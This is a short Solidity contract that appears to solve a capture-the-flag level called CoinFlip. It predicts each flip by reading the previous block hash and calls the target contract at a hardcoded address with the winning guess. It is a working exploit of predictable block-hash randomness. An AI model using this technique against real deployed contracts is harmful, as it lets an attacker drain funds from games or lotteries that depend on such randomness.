// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
  function flip(bool) public returns (bool) {}
}

contract Solve_3{
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address instanceAddress = 0x120adC3e10Ebbe3466747A9ef90748a0db04dc7C;
    CoinFlip cf;
    function Existing() public {
        cf = CoinFlip(instanceAddress);
    }

    function GuessFlip() public{
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool result = false;
        if(blockValue / FACTOR == 1)
            result = cf.flip(true);
        else
            result = cf.flip(false);

        require(result, "Data send failed");
    }
}